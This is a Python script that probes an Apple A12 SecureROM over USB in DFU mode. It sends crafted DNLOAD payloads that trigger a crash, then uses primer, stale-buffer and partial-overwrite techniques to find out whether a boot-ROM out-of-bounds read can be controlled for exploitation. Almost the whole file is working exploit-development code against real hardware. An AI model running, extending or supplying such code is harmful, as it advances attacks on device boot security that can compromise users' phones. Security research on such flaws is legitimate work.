#!/usr/bin/env python3
"""
A12 SecureROM OOB Read Control Probe
=====================================
Tests if we can control what SecureROM reads beyond the 15B boundary.

Strategy:
  1. PRIMER: Send large payload (pattern-filled) → manifest OK → reset to idle
  2. TRIGGER: Send ≤15B → crash, but OOB read should hit primer data
  3. If crash behavior changes (timing, no crash) → we control OOB = exploitable

Also tests:
  - Multi-block DNLOAD: primer in block 0, trigger in block 1
  - Stale buffer: does data persist between manifest cycles?
  - Heap spray: multiple primers before trigger
"""
import sys, time, struct, json
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
RESULTS_DIR = Path(__file__).parent.resolve() / "results"
RESULTS_DIR.mkdir(exist_ok=True)

class OOBProbe:
    def __init__(self):
        self.dev = None
        self.results = []

    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        print(f"[{ts}] {msg}", flush=True)

    def get_backend(self):
        return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

    def connect(self):
        self.dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=self.get_backend())
        if self.dev:
            try: self.dev.set_configuration()
            except: pass
            return True
        return False

    def get_status(self):
        try:
            r = self.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=2000)
            if len(r) >= 6:
                return {"bStatus": r[0], "bState": r[4],
                        "poll_ms": r[1]|(r[2]<<8)|(r[3]<<16)}
        except: pass
        return None

    def reset_to_idle(self):
        for _ in range(20):
            st = self.get_status()
            if not st: return self._reconnect()
            if st["bState"] == 2: return True
            if st["bState"] == 10:
                self.dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
            elif st["bState"] == 8:
                return self._reconnect()
            else:
                self.dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
            time.sleep(0.05)
        return False

    def _reconnect(self):
        try: self.dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
        except: pass
        try: self.dev.reset()
        except: pass
        time.sleep(2)
        try: usb.util.dispose_resources(self.dev)
        except: pass
        self.dev = None
        for _ in range(10):
            time.sleep(0.5)
            if self.connect():
                st = self.get_status()
                if st and st["bState"] == 2: return True
                if st and st["bState"] == 10:
                    self.dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
                    time.sleep(0.1)
                    st2 = self.get_status()
                    if st2 and st2["bState"] == 2: return True
        return False

    def dnload(self, payload, block=0):
        try:
            self.dev.ctrl_transfer(0x21, 1, block, 0, payload, timeout=2000)
            return True
        except: return False

    def do_manifest(self, payload, block_start=0):
        """Send payload via DNLOAD + trigger manifest. Returns manifest time or None if crash."""
        if not self.dnload(payload, block=block_start):
            return None
        st = self.get_status()
        if not st: return None
        time.sleep(max(0.01, st["poll_ms"]/1000) + 0.01)
        for _ in range(5):
            st = self.get_status()
            if st and st["bState"] == 5: break
            if not st: return None
            time.sleep(0.06)

        # Zero-length → manifest
        if not self.dnload(b"", block=block_start+1):
            return None

        t0 = time.perf_counter()
        for _ in range(40):
            st = self.get_status()
            t_ms = (time.perf_counter() - t0) * 1000
            if not st:
                time.sleep(0.5)
                alive = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=self.get_backend())
                if not alive: return -t_ms  # negative = crash
                continue
            if st["bState"] == 6:
                time.sleep(max(0.01, st["poll_ms"]/1000) + 0.01)
            elif st["bState"] == 7:
                time.sleep(max(0.5, st["poll_ms"]/1000) + 0.5)
            elif st["bState"] == 8:
                return t_ms
            elif st["bState"] == 10:
                self.dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
                return t_ms  # error but alive
            else:
                time.sleep(0.03)
        return (time.perf_counter() - t0) * 1000

    def device_alive(self):
        try:
            d = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=self.get_backend())
            return d is not None
        except: return False

    def test_stale_buffer(self, primer_size, primer_byte, trigger_size):
        """
        1. Send primer (large, pattern-filled) → manifest OK
        2. Reset to idle
        3. Send trigger (small) → observe if crash differs
        """
        name = f"stale_{primer_size}x{primer_byte:02x}_then_{trigger_size}B"
        self.log(f"  [{name}]")

        # Step 1: Primer
        primer = bytes([primer_byte]) * primer_size
        if not self.reset_to_idle():
            self.log(f"    SKIP: can't reach idle for primer")
            return {"name": name, "error": "no_idle_primer"}

        self.log(f"    Primer: {primer_size}B of 0x{primer_byte:02x}")
        t = self.do_manifest(primer)
        if t is None or t < 0:
            self.log(f"    Primer CRASHED (unexpected)")
            return {"name": name, "error": "primer_crashed", "primer_ms": t}
        self.log(f"    Primer OK: {t:.0f}ms")

        # Step 2: Reset to idle
        if not self.reset_to_idle():
            self.log(f"    SKIP: can't reach idle after primer")
            return {"name": name, "error": "no_idle_after_primer"}

        # Step 3: Trigger
        trigger = b"\x30\x82\x10\x00" + b"\x00" * max(0, trigger_size - 4)
        trigger = trigger[:trigger_size]
        self.log(f"    Trigger: {trigger_size}B")
        t2 = self.do_manifest(trigger)
        crashed = t2 is not None and t2 < 0
        result = {
            "name": name, "primer_size": primer_size, "primer_byte": primer_byte,
            "trigger_size": trigger_size, "primer_ms": round(t, 1),
            "trigger_ms": round(abs(t2), 1) if t2 else None,
            "crashed": crashed, "survived": t2 is not None and t2 > 0
        }

        if crashed:
            self.log(f"    Trigger: CRASH @ {abs(t2):.0f}ms")
        elif t2 and t2 > 0:
            self.log(f"    Trigger: SURVIVED {t2:.0f}ms !!!")
        else:
            self.log(f"    Trigger: result={t2}")

        self.results.append(result)
        return result

    def test_no_primer(self, trigger_size):
        """Control: trigger without primer."""
        name = f"noprime_{trigger_size}B"
        self.log(f"  [{name}]")
        if not self.reset_to_idle():
            return {"name": name, "error": "no_idle"}
        trigger = b"\x30\x82\x10\x00" + b"\x00" * max(0, trigger_size - 4)
        trigger = trigger[:trigger_size]
        t = self.do_manifest(trigger)
        crashed = t is not None and t < 0
        result = {"name": name, "trigger_size": trigger_size,
                  "trigger_ms": round(abs(t), 1) if t else None, "crashed": crashed}
        if crashed:
            self.log(f"    CRASH @ {abs(t):.0f}ms")
        else:
            self.log(f"    OK: {t:.0f}ms")
        self.results.append(result)
        return result

    def test_partial_overwrite(self, first_size, second_size):
        """
        Send large DNLOAD (fills buffer), then WITHOUT manifest,
        send small DNLOAD that only overwrites first N bytes.
        Then trigger manifest — does it read old data at offset N+?
        
        DFU protocol: each DNLOAD replaces the buffer entirely.
        But maybe the implementation just overwrites the first N bytes?
        """
        name = f"partial_{first_size}then{second_size}B"
        self.log(f"  [{name}]")
        if not self.reset_to_idle():
            return {"name": name, "error": "no_idle"}

        # First DNLOAD: fill buffer with pattern
        first = b"\x41" * first_size
        if not self.dnload(first, block=0):
            return {"name": name, "error": "dnload1_fail"}
        st = self.get_status()
        if not st: return {"name": name, "error": "status1_fail"}
        time.sleep(max(0.01, st["poll_ms"]/1000) + 0.01)
        for _ in range(5):
            st = self.get_status()
            if st and st["bState"] == 5: break
            time.sleep(0.06)

        # Second DNLOAD: overwrite with small payload (same block!)
        # This REPLACES block 0 — but does the DFU impl zero the old buffer?
        second = b"\x30\x82\x10\x00" + b"\x00" * max(0, second_size - 4)
        second = second[:second_size]
        if not self.dnload(second, block=0):
            return {"name": name, "error": "dnload2_fail"}
        st = self.get_status()
        if not st: return {"name": name, "error": "status2_fail"}
        time.sleep(max(0.01, st["poll_ms"]/1000) + 0.01)
        for _ in range(5):
            st = self.get_status()
            if st and st["bState"] == 5: break
            time.sleep(0.06)

        # Trigger manifest
        if not self.dnload(b"", block=1):
            return {"name": name, "error": "manifest_trigger_fail"}
        t0 = time.perf_counter()
        for _ in range(40):
            st = self.get_status()
            t_ms = (time.perf_counter() - t0) * 1000
            if not st:
                time.sleep(0.5)
                if not self.device_alive():
                    self.log(f"    CRASH @ {t_ms:.0f}ms")
                    self.results.append({"name": name, "first": first_size,
                        "second": second_size, "crashed": True, "ms": round(t_ms, 1)})
                    return self.results[-1]
                continue
            if st["bState"] == 6:
                time.sleep(max(0.01, st["poll_ms"]/1000) + 0.01)
            elif st["bState"] == 7:
                time.sleep(max(0.5, st["poll_ms"]/1000) + 0.5)
            elif st["bState"] == 8:
                t_ms = (time.perf_counter() - t0) * 1000
                self.log(f"    SURVIVED {t_ms:.0f}ms !!!")
                self.results.append({"name": name, "first": first_size,
                    "second": second_size, "crashed": False, "survived": True, "ms": round(t_ms, 1)})
                return self.results[-1]
            elif st["bState"] == 10:
                t_ms = (time.perf_counter() - t0) * 1000
                self.log(f"    ERROR state ({t_ms:.0f}ms)")
                self.dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
                self.results.append({"name": name, "first": first_size,
                    "second": second_size, "crashed": False, "error_state": True, "ms": round(t_ms, 1)})
                return self.results[-1]
            else:
                time.sleep(0.03)
        return {"name": name, "error": "timeout"}

    def run(self, mode="all"):
        self.log("=" * 60)
        self.log("A12 SecureROM OOB Read Control Probe")
        self.log("=" * 60)

        if not self.connect():
            self.log("NO DFU DEVICE!"); return

        if mode in ("all", "partial"):
            # === TEST 1: Partial overwrite (most promising) ===
            self.log("\n--- PARTIAL OVERWRITE TESTS ---")
            self.log("Send big DNLOAD, then small DNLOAD (same block), then manifest")
            # Does the buffer retain old data beyond the new small payload?
            for second_sz in [10, 12, 14, 15]:
                r = self.test_partial_overwrite(512, second_sz)
                if r.get("crashed"):
                    self.log(f"  Device crashed, need DFU re-entry for next test")
                    break
                if not self.reset_to_idle():
                    if not self._reconnect():
                        self.log("Lost device"); break

        if mode in ("all", "stale"):
            # === TEST 2: Stale buffer after manifest ===
            self.log("\n--- STALE BUFFER TESTS ---")
            self.log("Primer (large manifest) → reset → trigger (small manifest)")
            for primer_byte in [0x41, 0xCC]:
                for trigger_sz in [10, 15]:
                    r = self.test_stale_buffer(512, primer_byte, trigger_sz)
                    if r.get("crashed"):
                        self.log(f"  Device crashed, need DFU re-entry")
                        break
                    if not self.reset_to_idle():
                        if not self._reconnect():
                            self.log("Lost device"); break
                else: continue
                break

        if mode in ("all", "control"):
            # === TEST 3: Control (no primer) ===
            self.log("\n--- CONTROL (no primer) ---")
            r = self.test_no_primer(10)
            if not r.get("crashed"):
                self.log("  Unexpected: 10B didn't crash without primer!")

        self.save_results()

    def save_results(self):
        data = {"probe": "oob_control", "timestamp": datetime.now().isoformat(),
                "results": self.results}
        outf = RESULTS_DIR / "oob_control_probe.json"
        with open(outf, "w") as f:
            json.dump(data, f, indent=2)
        self.log(f"\nResults: {outf}")
        self.log(f"\n{'='*60}")
        self.log("SUMMARY:")
        for r in self.results:
            tag = "CRASH" if r.get("crashed") else ("SURVIVE" if r.get("survived") else "OTHER")
            ms = r.get("trigger_ms") or r.get("ms") or "?"
            self.log(f"  [{tag:7s}] {r['name']:40s} | {ms}ms")

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--mode", default="partial", choices=["all","partial","stale","control"])
    args = p.parse_args()
    probe = OOBProbe()
    probe.run(mode=args.mode)
